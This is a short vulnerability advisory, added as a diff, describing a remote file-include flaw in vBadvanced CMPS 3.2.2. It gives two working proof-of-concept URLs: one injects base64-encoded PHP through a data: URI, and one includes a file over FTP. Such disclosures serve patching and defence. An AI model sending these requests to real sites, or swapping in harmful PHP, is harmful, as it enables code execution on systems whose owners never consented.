@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/51672/info
+
+vBadvanced CMPS is prone to a remote file-include vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting this issue may allow an attacker to execute arbitrary local and remote scripts in the context of the affected application or obtain potentially sensitive information. This may result in a compromise of the application and the underlying system; other attacks are also possible.
+
+vBadvanced CMPS 3.2.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/vb/includes/vba_cmps_include_bottom.php?pages[pageid]=123&allowview=123&pages[type]=php_file&vba_cusmodid=123&pages[template]=data:;base64,PD9waHAgcGhwaW5mbygpO29iX2VuZF9mbHVzaCgpO2V4aXQ7Pz4=
+
+http://www.example.com/vb/includes/vba_cmps_include_bottom.php?pages[pageid]=123&allowview=123&pages[type]=php_file&vba_cusmodid=123&pages[template]=ftp://user:pass@127.0.0.1/123.txt 
